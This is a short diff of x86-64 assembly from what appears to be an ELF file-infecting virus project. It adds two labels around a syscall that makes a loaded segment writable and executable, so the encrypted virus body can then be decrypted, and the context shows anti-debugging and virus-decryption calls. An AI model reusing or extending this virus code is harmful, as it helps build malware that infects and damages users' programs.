@@ -21,7 +21,8 @@
 section .text
 	global famine_entry
 	global _start
-
+	global mprotect_call
+	global mprotect_end
 extern detect_spy
 extern decypher
 extern virus
@@ -102,6 +103,7 @@ mark_below:
 	test rax, rax
 	jnz return_to_client
 ;------------------------------; make ptld writable
+mprotect_call:
 	mov r8, [rsp + 32]         ; get ptld addr
 	mov r9, [rsp + 24]         ; get ptld len
 
@@ -112,6 +114,7 @@ mark_below:
 	mov rdx, PROT_RWX
 	mov rax, SYSCALL_MPROTECT
 	syscall
+mprotect_end:
 ;------------------------------; decypher virus
 	mov rdi, [rsp + 16]        ; get virus_addr
 	mov rsi, r14               ; get virus_size
